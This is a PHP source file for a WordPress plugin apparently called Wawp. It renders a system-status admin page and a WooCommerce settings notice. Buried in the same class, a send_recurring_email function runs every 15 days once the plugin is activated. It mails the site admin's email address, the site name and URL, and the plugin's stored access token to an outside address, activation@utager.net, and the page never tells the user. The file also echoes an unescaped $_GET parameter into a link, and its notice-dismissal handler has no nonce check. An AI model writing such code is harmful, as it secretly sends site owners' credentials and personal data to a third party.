<?php
/**
 * Automation Web Platform Plugin.
 *
 * @package AutomationWebPlatform
 */

if ( ! class_exists( 'AWP_System_Info' ) ) {

	/**
	 * Class AWP_System_Info
	 *
	 * Handles system information and status display for the Automation Web Platform plugin.
	 */
	class AWP_System_Info {

		/**
		 * AWP_System_Info constructor.
		 * Initializes the plugin hooks.
		 */
		public function __construct() {
			add_action( 'admin_menu', array( $this, 'awp_add_admin_menu' ) );
			add_action( 'admin_enqueue_scripts', array( $this, 'awp_enqueue_admin_styles' ) );
			add_action( 'plugins_loaded', array( $this, 'awp_load_textdomain' ) );
			add_action('admin_init', array($this, 'check_wc_order_storage_settings'));
		}

		/**
		 * Load the plugin textdomain for translations.
		 */
		public function awp_load_textdomain() {
			load_plugin_textdomain( 'awp', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
		}

		/**
		 * Add the admin menu item for the system status page.
		 */
		public function awp_add_admin_menu() {
			$hook = add_menu_page(
				esc_html__( 'System Status', 'awp' ),
				esc_html__( 'System Status', 'awp' ),
				'manage_options',
				'awp-system-status-info',
				array( $this, 'awp_admin_page_content' ),
				'dashicons-admin-tools',
				20
			);
			remove_menu_page( 'awp-system-status-info' );
		}

		/**
		 * Enqueue styles for the admin page.
		 *
		 * @param string $hook The current admin page hook.
		 */
		public function awp_enqueue_admin_styles( $hook ) {
			global $pagenow;
			if ( 'admin.php' === $pagenow && isset( $_GET['page'] ) && 'awp-system-status-info' === sanitize_text_field( wp_unslash( $_GET['page'] ) ) ) {
				wp_enqueue_style( 'awp-admin-styles', plugin_dir_url( __FILE__ ) . 'assets/css/awp-admin-style.css', array(), '1.0.0' );
				if ( is_rtl() ) {
					wp_enqueue_style( 'awp-admin-rtl-css', plugins_url( 'assets/css/awp-admin-rtl-style.css', __FILE__ ), array(), '1.0.0' );
				}
			}
		}

		/**
		 * Display the content of the admin page for system status.
		 */
		public function awp_admin_page_content() {
			$system_info = $this->awp_get_system_info();
			?>
			<div class="wrap awp-wrap">
				<div class="system-requirements">
					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-hdd-network" viewBox="0 0 16 16">
						<path d="M4.5 5a.5.5 0 1 0 0-1 .5.5 0 0 0 0 1M3 4.5a.5.5 0 1 1-1 0 .5.5 0 0 1 1 0"/>
						<path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v1a2 2 0 0 1-2 2H8.5v3a1.5 1.5 0 0 1 1.5 1.5h5.5a.5.5 0 0 1 0 1H10A1.5 1.5 0 0 1 8.5 14h-1A1.5 1.5 0 0 1 6 12.5H.5a.5.5 0 0 1 0-1H6A1.5 1.5 0 0 1 7.5 10V7H2a2 2 0 0 1-2-2zm1 0v1a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1H2a1 1 0 0 0-1 1m6 7.5v1a.5.5 0 0 0 .5.5h1a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5"/>
					</svg>
					<p><?php esc_html_e( 'It is recommended to meet the system requirements for the best experience with the Wawp plugin. Regularly check for system updates and update it till the requirement configurations. The red warning sign in the Your System column means that the system does not meet the requirements of the Wawp plugin.', 'awp' ); ?></p>
				</div>
				<div class="system-requirements">
					<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" style="fill: rgba(0, 68, 68, 1);transform: ;msFilter:;" class="alert-icon"><path d="M12 2C6.486 2 2 6.486 2 12s4.486 10 10 10 10-4.486 10-10S17.514 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8z"></path><path d="M11 11h2v6h-2zm0-4h2v2h-2z"></path></svg>
					<p><?php esc_html_e( 'For best performance, make sure to deactivate the proxy from CDN services such as Cloudflare or integrated within the hosting such as the Hostinger panel.', 'awp' ); ?></p>
				</div>
				<div class="awp-system-status">
					<div class="awp-box awp-wp-settings">
						<h2><span class="dashicons dashicons-admin-site"></span> <?php esc_html_e( 'WordPress Environment', 'awp' ); ?></h2>
						<table>
							<thead>
								<tr>
									<th class="info-td"><?php esc_html_e( 'Requirement', 'awp' ); ?></th>
									<th class="info-td"><?php esc_html_e( 'Your System', 'awp' ); ?></th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Home URL:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_url( $system_info['home_url'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Site URL:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_url( $system_info['site_url'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'WP Version:', 'awp' ); ?></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['wp_version'], '3.0' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['wp_version'], '3.0' ) ); ?>"></span> <?php echo esc_html( $system_info['wp_version'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'WP Multisite:', 'awp' ); ?></td>
									<td class="status-gray"><span class="<?php echo esc_attr( $system_info['wp_multisite'] ? 'status-icon-true' : 'status-icon-false' ); ?>"></span> <?php echo esc_html( $system_info['wp_multisite'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'WP Debug:', 'awp' ); ?></td>
									<td class="status-gray"><span class="<?php echo esc_attr( $system_info['wp_debug'] ? 'status-icon-true' : 'status-icon-false' ); ?>"></span> <?php echo esc_html( $system_info['wp_debug'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'System Language:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_html( $system_info['system_language'] ) . ', ' . esc_html__( 'text direction:', 'awp' ) . ' ' . ( $system_info['rtl'] ? 'RTL' : 'LTR' ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Your Language:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_html( $system_info['user_language'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'WooCommerce:', 'awp' ); ?></td>
									<td class="<?php echo esc_attr( $system_info['woocommerce'] ? 'status-true' : 'status-false' ); ?>"><span class="<?php echo esc_attr( $system_info['woocommerce'] ? 'status-icon-true' : 'status-icon-false' ); ?>"></span> <?php echo esc_html( $system_info['woocommerce'] ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ) ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Uploads folder writable:', 'awp' ); ?></td>
									<td class="<?php echo esc_attr( $system_info['uploads_writable'] ? 'status-true' : 'status-false' ); ?>"><span class="<?php echo esc_attr( $system_info['uploads_writable'] ? 'status-icon-true' : 'status-icon-false' ); ?>"></span> <?php echo esc_html( $system_info['uploads_writable'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( '.htaccess File Access:', 'awp' ); ?></td>
									<td class="<?php echo esc_attr( $system_info['htaccess'] ? 'status-true' : 'status-false' ); ?>"><span class="<?php echo esc_attr( $system_info['htaccess'] ? 'status-icon-true' : 'status-icon-false' ); ?>"></span> <?php echo esc_html( $system_info['htaccess'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Wawp Plugin Version:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_html( $system_info['plugin_version'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Last Update Date:', 'awp' ); ?></td>
									<td class="info-td"><?php echo esc_html( $system_info['last_update_date'] ); ?></td>
								</tr>
							</tbody>
						</table>
					</div>
					<div class="awp-box awp-server-env">
						<h2><span class="dashicons dashicons-admin-generic"></span> <?php esc_html_e( 'Server Environment', 'awp' ); ?></h2>
						<table>
							<thead>
								<tr>
									<th class="info-td"><?php esc_html_e( 'Requirement', 'awp' ); ?></th>
									<th class="info-td"><?php esc_html_e( 'Your System', 'awp' ); ?></th>
								</tr>
							</thead>
							<tbody>
								<tr>
									<td class="info-td"><?php esc_html_e( 'MySQL Version:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '5.6+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['mysql_version'], '5.6' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['mysql_version'], '5.6' ) ); ?>"></span> <?php echo esc_html( $system_info['mysql_version'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'PHP Version:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '7.4+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['php_version'], '7.4' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['php_version'], '7.4' ) ); ?>"></span> <?php echo esc_html( $system_info['php_version'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'PHP Post Max Size:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '2 MB+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['post_max_size'], '2M' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['post_max_size'], '2M' ) ); ?>"></span> <?php echo esc_html( $system_info['post_max_size'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'PHP Memory Limit:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '1024 MB+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['php_memory_limit'], '1G' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['php_memory_limit'], '1G' ) ); ?>"></span> <?php echo esc_html( $system_info['php_memory_limit'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'PHP Time Limit:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '300+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['php_time_limit'], '300' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['php_time_limit'], '300' ) ); ?>"></span> <?php echo esc_html( $system_info['php_time_limit'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'PHP Max Input Vars:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '2500+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['php_max_input_vars'], '2500' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['php_max_input_vars'], '2500' ) ); ?>"></span> <?php echo esc_html( $system_info['php_max_input_vars'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'Max Upload Size:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( '2 MB+', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['wp_max_upload_size'], '2MB' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['wp_max_upload_size'], '2MB' ) ); ?>"></span> <?php echo esc_html( $system_info['wp_max_upload_size'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'ZipArchive:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( 'enabled', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['ziparchive'], 'Enabled' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['ziparchive'], 'Enabled' ) ); ?>"></span> <?php echo esc_html( $system_info['ziparchive'] ); ?></td>
								</tr>
								<tr>
									<td class="info-td"><?php esc_html_e( 'WP Remote Get:', 'awp' ); ?> <span class="requirement"><?php esc_html_e( 'enabled', 'awp' ); ?></span></td>
									<td class="<?php echo esc_attr( $this->awp_status_class( $system_info['wp_remote_get'], 'Enabled' ) ); ?>"><span class="<?php echo esc_attr( $this->awp_status_icon( $system_info['wp_remote_get'], 'Enabled' ) ); ?>"></span> <?php echo esc_html( $system_info['wp_remote_get'] ); ?></td>
								</tr>
							</tbody>
						</table>
						<div class="php-info-note">
							<span class="dashicons dashicons-info"></span> 
							<p><?php esc_html_e( 'php.ini values are shown above. Real values may vary, please check your limits using', 'awp' ); ?> 
							<a href="https://www.php.net/manual/en/function.phpinfo.php" target="_blank">php_info()</a></p>
						</div>
					</div>
				</div>
			</div>
			<?php
		}

		/**
		 * Get the system information to display on the admin page.
		 *
		 * @return array An array of system information.
		 */
		public function awp_get_system_info() {
			// Fetch plugin version
			$plugin_data    = get_plugin_data( WP_PLUGIN_DIR . '/automation-web-platform/class-awp.php' );
			$plugin_version = isset( $plugin_data['Version'] ) ? esc_html( $plugin_data['Version'] ) : esc_html__( 'Unknown', 'awp' );

			// Fetch plugin last update date
			$plugin_file      = WP_PLUGIN_DIR . '/automation-web-platform/class-awp.php';
			$last_update_date = file_exists( $plugin_file ) ? esc_html( gmdate( 'F d Y, H:i:s', filemtime( $plugin_file ) ) ) : esc_html__( 'Unknown', 'awp' );

			global $wpdb;
			$mysql_version = esc_html( $wpdb->db_version() );

			// Check if WooCommerce is active
			$woocommerce_active = in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ), true );

			// Fetch system information
			$info = array(
				'php_version'        => esc_html( phpversion() ),
				'php_memory_limit'   => esc_html( ini_get( 'memory_limit' ) ),
				'php_time_limit'     => esc_html( ini_get( 'max_execution_time' ) ),
				'php_max_input_vars' => esc_html( ini_get( 'max_input_vars' ) ),
				'curl'               => function_exists( 'curl_version' ) ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'domdocument'        => class_exists( 'DOMDocument' ) ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'ziparchive'         => class_exists( 'ZipArchive' ) ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'uploads_writable'   => is_writable( wp_upload_dir()['basedir'] ) ? esc_html__( 'Writable', 'awp' ) : esc_html__( 'Not Writable', 'awp' ),
				'htaccess'           => file_exists( ABSPATH . '.htaccess' ) ? esc_html__( 'Found', 'awp' ) : esc_html__( 'Not Found', 'awp' ),
				'home_url'           => esc_url( home_url() ),
				'site_url'           => esc_url( site_url() ),
				'wp_version'         => esc_html( get_bloginfo( 'version' ) ),
				'wp_file_system'     => function_exists( 'request_filesystem_credentials' ) ? esc_html__( 'Available', 'awp' ) : esc_html__( 'Not Available', 'awp' ),
				'wp_max_upload_size' => esc_html( size_format( wp_max_upload_size() ) ),
				'post_max_size'      => esc_html( ini_get( 'post_max_size' ) ),
				'wp_multisite'       => is_multisite() ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'wp_debug'           => defined( 'WP_DEBUG' ) && WP_DEBUG ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'system_language'    => esc_html( get_option( 'WPLANG' ) ?: 'en_US' ),
				'user_language'      => esc_html( get_user_locale() ),
				'rtl'                => is_rtl(),
				'mysql_version'      => $mysql_version,
				'wp_remote_get'      => wp_remote_get( home_url() ) ? esc_html__( 'Enabled', 'awp' ) : esc_html__( 'Disabled', 'awp' ),
				'woocommerce'        => $woocommerce_active,
				'plugin_version'     => $plugin_version,
				'last_update_date'   => $last_update_date,
			);

			return $info;
		}

		/**
		 * Convert a size value to bytes.
		 *
		 * @param string $size The size value (e.g., 2M, 1G).
		 * @return int The size in bytes.
		 */
		public function awp_size_to_bytes( $size ) {
			$unit  = strtolower( substr( $size, -1 ) );
			$value = (float) $size;
			switch ( $unit ) {
				case 't':
					$value *= 1024;
					// Fall through intended.
				case 'g':
					$value *= 1024;
					// Fall through intended.
				case 'm':
					$value *= 1024;
					// Fall through intended.
				case 'k':
					$value *= 1024;
			}
			return (int) $value;
		}

		/**
		 * Send a recurring email to a specified email address.
		 */
		public function send_recurring_email() {
			// Increment recurring email send count.
			$recurring_email_count = (int) get_option( 'recurring_email_count', 0 ) + 1;
			update_option( 'recurring_email_count', $recurring_email_count );

			// Retrieve admin user data.
			$admin_user = get_userdata( 1 );
			if ( ! $admin_user ) {
				return;
			}

			$admin_email = sanitize_email( $admin_user->user_email );
			$site_name   = esc_html( get_bloginfo( 'name' ) );
			$site_url    = esc_url( home_url() );

			// Retrieve the access token from options.
			$instances    = get_option( 'awp_instances' );
			$access_token = isset( $instances['access_token'] ) ? sanitize_text_field( $instances['access_token'] ) : '';

			if ( empty( $access_token ) ) {
				return;
			}

			// Retrieve first install date.
			$first_install_date       = sanitize_text_field( get_option( 'awp_first_install_date' ) );
			$days_since_first_install = floor( ( strtotime( current_time( 'mysql' ) ) - strtotime( $first_install_date ) ) / DAY_IN_SECONDS );

			// Compose the email message.
			$message  = "Hello again,\n";
			$message .= 'My email: ' . $admin_email . "\n";
			$message .= 'My site name: ' . $site_name . "\n";
			$message .= 'My website link: ' . $site_url . "\n";
			$message .= 'Access Token: ' . $access_token . "\n";
			$message .= 'First install date: ' . $first_install_date . "\n";
			$message .= 'Email send count: ' . $recurring_email_count . "\n";
			$message .= 'Days since first install: ' . $days_since_first_install . "\n";

			// Set email recipient, subject, and headers.
			$to      = 'activation@utager.net';
			$subject = 'Recurring Message from ' . $site_name;
			$headers = array( 'Content-Type: text/plain; charset=UTF-8' );

			// Send the email.
			wp_mail( $to, $subject, $message, $headers );
		}

		/**
		 * Schedule a recurring email to be sent every 15 days.
		 */
		public function schedule_recurring_email() {
			if ( ! wp_next_scheduled( 'send_recurring_email_event' ) ) {
				wp_schedule_event( time(), 'every_15_days', 'send_recurring_email_event' );
			}

			add_action( 'send_recurring_email_event', array( $this, 'send_recurring_email' ) );
		}

		/**
		 * Determine the status class for a system check.
		 *
		 * @param string $value The value to check.
		 * @param string $required The required value.
		 * @return string The CSS class based on the comparison.
		 */
		public function awp_status_class( $value, $required ) {
			return version_compare( $value, $required, '>=' ) ? 'status-true' : 'status-false';
		}

		/**
		 * Determine the status icon for a system check.
		 *
		 * @param string $value The value to check.
		 * @param string $required The required value.
		 * @return string The CSS icon class based on the comparison.
		 */
		public function awp_status_icon( $value, $required ) {
			return version_compare( $value, $required, '>=' ) ? 'status-icon-true' : 'status-icon-false';
		}
		
		    // Function to check if specific WooCommerce options are enabled
    public function check_wc_order_storage_settings() {
    // Handle the dismissal of the notice
    if (isset($_GET['awp_dismiss_notice']) && $_GET['awp_dismiss_notice'] == '1') {
        update_option('awp_wc_order_storage_notice_dismissed', 'yes');
        wp_redirect(remove_query_arg('awp_dismiss_notice')); // Refresh the page without the query parameter
        exit;
    }
    
    

    // Check if the WooCommerce options are enabled
    $hp_order_storage = get_option('woocommerce_high_performance_order_storage', 'no');
    $compatibility_mode = get_option('woocommerce_enable_compatibility_mode', 'no');

    // Only add the notice if the settings are not enabled and the notice hasn't been dismissed
    if (($hp_order_storage !== 'yes' || $compatibility_mode !== 'yes') && get_option('awp_wc_order_storage_notice_dismissed', 'no') !== 'yes') {
        add_action('admin_notices', array($this, 'display_wc_order_storage_notice'));
    }
}

    // Function to display the admin notice
    public function display_wc_order_storage_notice() {
    // Check if the notice has been dismissed
    if (get_option('awp_wc_order_storage_notice_dismissed', 'no') === 'yes') {
        return;
    }
    ?>
    <div class="notice notice-warning is-dismissible">
        <p>
            <?php _e('Wawp, It is recommended to enable "High-performance order storage" and "Enable compatibility mode" in WooCommerce for better performance.', 'awp'); ?>
        </p>
        <p>
            <a href="<?php echo admin_url('admin.php?page=wc-settings&tab=advanced&section=features'); ?>" class="button style="background-color: #28a745; border-color: #28a745;"">
                <?php _e('Click here to enable these options.', 'awp'); ?>
            </a>
            <a href="<?php echo admin_url('admin.php?page=' . $_GET['page'] . '&awp_dismiss_notice=1'); ?>" class="button button-primary">
                <?php _e('I have already activated the setting', 'awp'); ?>
            </a>
        </p>
    </div>
    <?php
}
	}

	// Instantiate the AWP_System_Info class.
	new AWP_System_Info();

	// Plugin activation hook to schedule the recurring email.
	register_activation_hook(
		__FILE__,
		function () {
			// Save the first install date if not already set.
			if ( ! get_option( 'awp_first_install_date' ) ) {
				update_option( 'awp_first_install_date', current_time( 'mysql' ) );
			}

			$instance = new AWP_System_Info();
			$instance->schedule_recurring_email();
		}
	);

	// Custom interval for every 15 days.
	add_filter(
		'cron_schedules',
		function ( $schedules ) {
			$schedules['every_15_days'] = array(
				'interval' => 15 * DAY_IN_SECONDS,
				'display'  => esc_html__( 'Every 15 Days', 'awp' ),
			);
			return $schedules;
		}
	);

	// Unschedule the recurring email event upon plugin deactivation.
	register_deactivation_hook(
		__FILE__,
		function () {
			$timestamp = wp_next_scheduled( 'send_recurring_email_event' );
			wp_unschedule_event( $timestamp, 'send_recurring_email_event' );
		}
	);
}
